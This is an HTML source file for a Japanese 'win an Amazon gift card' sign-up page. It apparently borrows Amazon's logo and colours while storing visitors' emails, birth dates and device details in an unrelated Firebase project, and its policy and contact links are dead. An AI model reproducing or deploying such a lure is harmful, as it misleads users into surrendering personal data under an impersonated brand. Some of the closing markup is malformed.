<!doctype html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Amazonギフトカードを当てよう！</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700">
<style>
body { font-family: 'Roboto', sans-serif; background:#f7f7f7; margin:0; padding:0; }
header { background-color:#232f3e; padding: 12px 16px; color:#fff; display:flex; align-items:center; }
header img { height:32px; margin-right:8px; }
header h1 { font-size:1.2rem; margin:0; }
main { max-width:600px; margin:0 auto; padding:16px; }
.hero { background-color:#fff; border-radius:8px; padding:24px; text-align:center; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
.hero h2 { color:#232f3e; font-size:1.8rem; margin-bottom:16px; }
.hero p { color:#333; margin-bottom:24px; }
button, .btn { background-color:#ff9900; color:#fff; border:none; padding:12px 20px; font-size:1rem; border-radius:4px; cursor:pointer; }
button:hover { background-color:#e88a00; }
.form-group { margin-bottom:16px; }
input, select { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; box-sizing: border-box; }
footer { background-color:#232f3e; color:#fff; padding:16px; text-align:center; font-size:0.8rem; margin-top:24px; }
footer a { color:#ff9900; text-decoration:none; margin:0 8px; }
.page { display:none; }
    #home { display:block; }

</style>
</head>
<body>
<header>
<img src="https://www.amazon.co.jp/favicon.ico" alt="Amazon">
<h1>Amazonギフトカードを当てよう！</h1>
</header>
<main>
<div id="home" class="page">
<div class="hero">
<h2>Amazonギフトカードを当てよう！</h2>
<p>簡単な登録で、Amazonギフトカードが当たるチャンス！</p>
<button id="goto-signup" class="btn">当選に対応する</button>
</div>
</div>
<div id="signup" class="page">
<h2>対応形式</h2>
<form id="signup-form">
<div class="form-group">
<label for="email">メールアドレス</label>
<input type="email" id="email" required>
</div>
<div class="form-group">
<label for="category">カテゴリ</label>
<select id="category">
<option value="">選択してください</option>
<option value="食品・飲料">食品・飲料</option>
<option value="家電・カメラ">家電・カメラ</option>
<option value="本・漬画">本・漬画</option>
<option value="ゲーム">ゲーム</option>
<option value="ファッション">ファッション</option>
<option value="ベビー・おもちゃ">ベビー・おもちゃ</option>
</select>
</div>
<div class="form-group">
<label for="device">デバイス</label>
<select id="device">
<option value="">選択してください</option>
<option>iPhone</option>
<option>Android</option>
<option>Windows</option>
<option>Mac</option>
<option>その他</option>
</select>
</div>
<div class="form-group">
<label for="dob">生年月日</label>
<input type="date" id="dob">
</div>
<div class="form-group">
<label for="origin">情報を知ったきっかけ</label>
<input type="text" id="origin" value="パンフレット">
</div>
<button type="submit" class="btn">メールで登録</button>
</form>
<button id="google-signin" class="btn" style="background-color:#4285f4;margin-top:8px;">Googleで登録</button>
</div>
<div id="confirm" class="page">
<h2>もう少し！</h2>
<p>確認メールを送りました。メール内のリンクをクリックして登録を完了してください。</p>
<p>メールが届かない場合は、下のボタンから再送できます。</p>
<button id="resend-link" class="btn">リンクを再送</button>
</div>
<div id="final" class="page">
<h2>ご登録ありがとうございます！</h2>
<p>抽選結果は後日メールでご連絡します。お友達と共有して当選確率をアップ！</p>
<p>さらに、SNSをフォローして最新情報をチェックしよう。</p>
</div>
</main>
<footer>
<a href="#">利用規約</a> | <a href="#">プライバシーポリシー</a> | <a href="#">お問い合わせ</a>
</footer>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getAuth,
  GoogleAuthProvider,
  signInWithPopup,
  sendSignInLinkToEmail,
  isSignInWithEmailLink,
  signInWithEmailLink
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
import {
  getFirestore,
  doc,
  setDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
const firebaseConfig = {
  apiKey: "AIzaSyDc38J7B44WGtrVLITTUNK1BW1WMWHCRXs",
  authDomain: "gift-16201.firebaseapp.com",
  projectId: "gift-16201",
  storageBucket: "gift-16201.appspot.com",
  messagingSenderId: "407279162898",
  appId: "1:407279162898:web:45f7c3f0c410380bf5aacb",
  measurementId: "G-88NSX88FF7"
};
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
function getAppUrl() {
  return "https://gift-16201.web.app/";
}
function showPage(pageId) {
  document.querySelectorAll(".page").forEach(el => el.style.display = "none");
  document.getElementById(pageId).style.display = "block";
}
document.getElementById("goto-signup").addEventListener("click", () => {
  showPage("signup");
});
document.getElementById("signup-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const email = document.getElementById("email").value.trim();
  const category = document.getElementById("category").value;
  const device = document.getElementById("device").value;
  const dob = document.getElementById("dob").value;
  const origin = document.getElementById("origin").value;
  if (!email) { alert("\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044\u3002"); return; }
  const signupData = { email, category, device, dob, origin };
  window.localStorage.setItem("signupData", JSON.stringify(signupData));
  const actionCodeSettings = { url: getAppUrl(), handleCodeInApp: true };
  try {
    await sendSignInLinkToEmail(auth, email, actionCodeSettings);
    window.localStorage.setItem("emailForSignIn", email);
    showPage("confirm");
  } catch (error) {
    console.error(error);
    alert("\u30e1\u30fc\u30eb\u9001\u4fe1\u306b\u5931\u6557\u3057\u307e\u3057\u305f\u3002");
  }
});
document.getElementById("resend-link").addEventListener("click", async () => {
  const email = window.localStorage.getItem("emailForSignIn");
  if (!email) { alert("\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9\u304c\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3002"); return; }
  const actionCodeSettings = { url: getAppUrl(), handleCodeInApp: true };
  try {
    await sendSignInLinkToEmail(auth, email, actionCodeSettings);
    alert("\u518d\u9001\u3057\u307e\u3057\u305f\u3002\u30e1\u30fc\u30eb\u3092\u78ba\u8a8d\u3057\u3066\u304f\u3060\u3055\u3044\u3002");
  } catch (error) {
    console.error(error);
    alert("\u518d\u9001\u306b\u5931\u6557\u3057\u307e\u3057\u305f\u3002");
  }
});
document.getElementById("google-signin").addEventListener("click", async () => {
  const provider = new GoogleAuthProvider();
  try {
    const result = await signInWithPopup(auth, provider);
    const user = result.user;
    let data = {};
    try { data = JSON.parse(window.localStorage.getItem("signupData")); } catch {}
    await setDoc(doc(db, "entries", user.uid), {
      email: user.email,
      category: data?.category || "",
      device: data?.device || "",
      dob: data?.dob || "",
      origin: data?.origin || "",
      method: "google",
      createdAt: serverTimestamp()
    });
    showPage("final");
  } catch (error) {
    console.error(error);
    alert("Google\u767b\u9332\u306b\u5931\u6557\u3057\u307e\u3057\u305f\u3002");
  }
});

(async () => {
    try {
        if (isSignInWithEmailLink(auth, window.location.href)) {
            let email = window.localStorage.getItem("emailForSignIn");
            if (!email) {
                email = window.prompt("\u30e1\u30fc\u30eb\u30a2\u30c9\u30ec\u30b9\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044");
            }
            const result = await signInWithEmailLink(auth, email, window.location.href);
            const user = result.user;
            let data = {};
            try {
                data = JSON.parse(window.localStorage.getItem("signupData")) || {};
            } catch {}
            await setDoc(doc(db, "entries", user.uid), {
                email: user.email,
                category: data.category || "",
                device: data.device || "",
                dob: data.dob || "",
                origin: data.origin || "",
                method: "email",
                createdAt: serverTimestamp()
            });
            window.localStorage.removeItem("emailForSignIn");
            window.localStorage.removeItem("signupData");
            showPage("final");
        }
    } catch (error) {
        console.error(error);
    }
})();
</script>
</script>
/body>
</html>
